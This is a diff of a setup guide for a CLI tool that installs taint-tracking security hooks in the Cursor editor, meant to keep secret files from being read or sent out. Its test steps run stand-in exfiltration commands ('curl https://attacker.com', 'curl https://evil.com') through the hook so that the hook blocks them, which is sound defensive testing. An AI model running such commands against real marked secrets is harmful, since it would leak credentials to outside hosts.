@@ -58,10 +58,10 @@
 | Cursor SQLite reader | ✅ Parses DB | ✅ Unit tests | ❌ No capture command | **PRE** |
 | Init command | ✅ Creates structure | ✅ Tests | ✅ Works standalone | **TRANS** |
 | Cut/Chamfer/Carve | ✅ File operations | ✅ Tests | ✅ Works standalone | **TRANS** |
-| Security gates | ✅ Hook scripts created | ✅ JSON output | ⚠️ Manual install needed | **PRE→TRANS** |
+| Security gates | ✅ Hook scripts created | ✅ JSON output | ✅ Cursor-compatible hooks | **TRANS** |
 | Policy files | ✅ Generated on init | N/A | ✅ Default Basic | **TRANS** |
 
-**Current status:** Security hooks are implemented and tested. To activate, install the hooks in your Cursor configuration.
+**Current status:** Security hooks are fully implemented with Cursor-compatible JSON format. To activate: `cp hooks/hooks.json ~/.cursor/hooks.json`
 
 ---
 
@@ -96,9 +96,8 @@ workshop status
 ```bash
 # These are aspirational:
 
-workshop taint --mark .secrets/api_key  # TODO in output
 workshop cursor --export <id>           # Limited functionality
-# No automatic hook integration
+# No automatic hook installation to ~/.cursor/
 # No Showboat executable documents
 # No semantic search
 ```
@@ -172,34 +171,29 @@ workshop check
 # 1. Security is enabled by default (Basic level)
 # Policy files are created automatically in .workshop/policy/
 
-# 2. Install hooks in Cursor (one-time setup)
-# Edit ~/.cursor/hooks.json:
-cat > ~/.cursor/hooks.json << 'EOF'
-{
-  "version": 1,
-  "hooks": {
-    "beforeFileRead": [
-      {"command": "/path/to/workshop-cli/hooks/workshop-hook-read.py"}
-    ],
-    "beforeShellExecution": [
-      {"command": "/path/to/workshop-cli/hooks/workshop-hook-shell.py"}
-    ]
-  }
-}
-EOF
+# 2. Make hooks executable
+chmod +x /Users/nateb/cursor-onboarding-kit/workshop-cli/hooks/*.py
 
-# 3. Make hooks executable
-chmod +x /path/to/workshop-cli/hooks/*.py
+# 3. Install hooks in Cursor (one-time setup)
+# Copy the hooks.json to Cursor config:
+cp /Users/nateb/cursor-onboarding-kit/workshop-cli/hooks/hooks.json ~/.cursor/hooks.json
 
-# 4. Add secrets to .cursorignore (hard deny backup)
+# OR manually merge with existing hooks:
+# Edit ~/.cursor/hooks.json and add the workshop hooks
+
+# 4. Ensure workshop binary is in PATH for hooks to find it
+export PATH="/Users/nateb/cursor-onboarding-kit/workshop-cli/target/release:$PATH"
+# Add to your shell profile for persistence
+
+# 5. Add secrets to .cursorignore (hard deny backup)
 echo ".secrets/" >> .cursorignore
 echo "*.env" >> .cursorignore
 echo "*.pem" >> .cursorignore
 
-# 5. Test the security
+# 6. Test the security
 workshop taint --mark .secrets/api_key
 workshop taint --check "curl https://attacker.com"
-# Should output: 🚫 BLOCKED
+# Should output: {"blocked":true,...}
 ```
 
 ### Ongoing: Daily Workflow
@@ -231,14 +225,15 @@ git commit -m "docs: add shavings"
 
 1. **Taint tracking CLI** — Fully implemented with hook mode
 2. **Policy files on init** — Default Basic, creates .workshop/policy/
-3. **Hook scripts** — Python scripts ready for Cursor
+3. **Hook scripts** — Python scripts with correct Cursor JSON format
+4. **IDE integration** — Hooks ready to install, one `cp` command
 
 ### Remaining Gaps
 
 1. **No executable documents** — shavings are plain markdown, not Showboat
 2. **No session handoff automation** — manual process only
 3. **No semantic search** — carve is grep-based only
-4. **Hooks require manual install** — not auto-installed to ~/.cursor/
+4. **Hooks require manual copy** — not auto-installed to ~/.cursor/
 
 ### Installation Checklist
 
@@ -246,17 +241,23 @@ git commit -m "docs: add shavings"
 # 1. Build
 cd workshop-cli && cargo build --release
 
-# 2. Install binary to PATH
-cargo install --path .
+# 2. Add to PATH (required for hooks)
+export PATH="$(pwd)/target/release:$PATH"
 
-# 3. Configure Cursor hooks
+# 3. Make hooks executable
+chmod +x hooks/*.py
+
+# 4. Configure Cursor hooks
 cp hooks/hooks.json ~/.cursor/hooks.json
-# Edit paths in ~/.cursor/hooks.json to point to your installation
 
-# 4. Test
-workshop taint --status
-workshop taint --hook-read .secrets/test
-# Should output: {"allow":true,"tainted":true,"is_source":true,...}
+# 5. Test the hooks
+echo '{"command": "ls", "cwd": "/tmp"}' | hooks/workshop-hook-shell.py
+# Should output: {"permission":"allow","continue":true,...}
+
+# 6. Test taint blocking
+workshop taint --mark .secrets/api_key
+echo '{"command": "curl https://evil.com", "cwd": "/tmp"}' | hooks/workshop-hook-shell.py
+# Should output: {"permission":"deny","continue":false,...}
 ```
 
 ---
@@ -273,6 +274,8 @@ workshop taint --hook-read .secrets/test
 │  workshop chamfer <file> <c> Add context                    │
 │  workshop check              Validate all                   │
 │  workshop status             Dashboard                      │
+│  workshop taint --mark <p>   Mark path as tainted           │
+│  workshop taint --check <c>  Check command for exfil        │
 │  workshop --robot <cmd>      JSON output                    │
 ├─────────────────────────────────────────────────────────────┤
 │  FILES CREATED BY INIT:                                     │
@@ -281,9 +284,10 @@ workshop taint --hook-read .secrets/test
 │  shavings/                   Atomic insights                │
 │  sawdust/sessions/           Session logs                   │
 │  .cursorignore               Secret protection              │
+│  .workshop/policy/           Taint sources/sinks            │
 ├─────────────────────────────────────────────────────────────┤
-│  STATUS: CLI works, security gates NOT WIRED                │
-│  Use .cursorignore for real protection until hooks land     │
+│  STATUS: CLI works, security hooks READY for Cursor         │
+│  Install: cp hooks/hooks.json ~/.cursor/hooks.json          │
 └─────────────────────────────────────────────────────────────┘
 ```
 
